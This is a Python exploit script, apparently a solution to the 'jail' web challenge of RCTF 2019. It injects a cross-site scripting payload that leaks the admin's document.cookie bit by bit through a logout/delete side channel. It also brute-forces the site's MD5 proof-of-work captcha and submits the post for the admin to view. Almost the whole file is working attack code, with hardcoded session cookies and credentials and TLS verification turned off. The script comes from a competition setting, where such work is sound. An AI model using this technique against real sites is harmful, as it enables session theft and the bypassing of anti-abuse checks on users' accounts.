import hashlib
import re
import time
import sys
import time
import requests

def hash(s, cipher):
    if cipher == 'sha1':
        return hashlib.sha1(s).hexdigest()
    elif cipher == 'sha224':
        return hashlib.sha224(s).hexdigest()
    elif cipher == 'sha256':
        return hashlib.sha256(s).hexdigest()
    elif cipher == 'sha384':
        return hashlib.sha384(s).hexdigest()
    elif cipher == 'sha512':
        return hashlib.sha512(s).hexdigest()
    elif cipher == 'md5':
        return hashlib.md5(s).hexdigest()

    raise ValueError('cipher not found %s' % cipher)

import os
import marshal

hashes = None
def break_hash(cipher, key):
    global hashes

    if hashes is None:
        exists = os.path.isfile('hashes.marshal')
        if not exists:
            hashes = {}
            for i in xrange(0, 10000000):#256**4):
                s = str(i)
                h = hash(s, cipher)
                hashes[ h[0:6] ] = s

                if (i & 1048575) == 1048575:
                    print('[*] hash loading at %s' % s)

            with open('hashes.marshal', 'wb') as f:
                marshal.dump(hashes, f)
        else:
            print('[*] loading lots of hashes')
            with open('hashes.marshal', 'rb') as f:
                hashes = marshal.load(f)
            print('[*] done loading')

    if key not in hashes:
        raise ValueError('matching hash not found')

    return hashes[key]

import urllib3
urllib3.disable_warnings()

req = None
def attack(i=0, j=0, tries=0):
    global req

    assert 1 <= j < 8
    assert 0 <= i
    assert 0 <= tries <= 4

    cookies = {"PHPSESSID": "7427a1a6be4f071ef1627a64f806ecc1"}
    if req is None:
        # os.environ["HTTP_PROXY"] = "http://localhost:8080"
        # os.environ["HTTPS_PROXY"] = "http://localhost:8080"

        req = requests.Session()
        req.cookies.update(cookies)
        req.verify = False
        req.allow_redirects = False

    word = 'retrying' if tries > 0 else 'trying'
    print('[*] %s for i=%d j=%d' % (word, i, j))

    payload = """
<script>
i=0x%08x;
j=0x%02x;

v = document.cookie;
s = v.charCodeAt(i).toString(2).padStart(8, '0')[j];

document.cookie="PHPSESSID=%s";

window.onload = function() {

method = null;
if (s === '1') {
    method = 'delete';
} else if(s === '0') {
    method = 'logout';
} else {
    method = 'bad';
}

document.write('<img src="https://jail.2019.rctf.rois.io/?action=index&method=' + method + '">');

};
</script>
""" % (i, j, cookies['PHPSESSID'])

    # submit post with payload
    url = 'https://jail.2019.rctf.rois.io/'
    resp = req.post(url, data={"message": payload},  allow_redirects=False)

    # login if not logged
    if resp.status_code == 302:
        url = 'https://jail.2019.rctf.rois.io/?action=login'
        data = {"username": "leethacker", "password": "leethacker"}
        resp = req.post(url, data=data, allow_redirects=False)

        # resend payload
        url = 'https://jail.2019.rctf.rois.io/'
        resp = req.post(url, data={"message": payload})

    # get post id
    post_id = resp.text.split('/?action=post&id=')[1].split('" target="')[0].encode('utf-8')
    print("[*] post_id: %s" % post_id)

    # go to feedback page
    url = 'https://jail.2019.rctf.rois.io/?action=feedback'
    resp = req.get(url)

    # get proof of work
    pow = resp.text.split('Captcha: substr(md5(captcha), 0, 6) == "')[1].split('"</label>')[0].encode('utf-8')
    print("[*] captcha: %s" % pow)

    while True:
        # submit post id
        # id=0&captcha=1780076&test=1
        url = 'https://jail.2019.rctf.rois.io/?action=feedback'
        data = {
            'id': post_id,
            'captcha': break_hash('md5', pow),
            'test': 1
        }
        resp = req.post(url, data=data)
        print('[*] sent post to feedback')
        if resp.text.find('Admin will view your post soon.') == -1:
            break

        # check if all posts were removed or not after 5 seconds
        time.sleep(5)
        url = 'https://jail.2019.rctf.rois.io/'
        resp = req.get(url, allow_redirects=False)

        # resp.text.find('Log-in to your account') != -1:
        if resp.status_code == 302:
            return 0
        elif resp.text.find(post_id) == -1:
            return 1
        else:
            break

        # save result and continue to next bit

    time.sleep(3)
    return attack(i, j, tries+1)

def bin_to_str(s):
    ret = ''
    for i in range(0, len(s)-7, 8):
        v = '0b'
        for j in range(0, 8):
            v += s[i+j]

        ret += chr(int(v, 2))

    return ret

def main():
    cipher = 'md5'
    if len(sys.argv) == 2:
        key = sys.argv[1]
        x = break_hash(cipher, key)
        print(x)
    else:
        s = ''
        istart = len(s) // 8
        for i in xrange(istart, 400):
            jstart = len(s) % 8
            if jstart == 0:
                s += '0'
                jstart += 1

            for j in range(jstart, 8):
                s += str(attack(i, j))
                print('[*] s = %s' % s)

            print('[*]')
            print('[*] flag is %s' % repr(bin_to_str(s)))
            print('[*]')

        print('[*] s = %s' % s)
        print('[*] flag is %s' % repr(bin_to_str(s)))

if __name__ == '__main__':
    main()
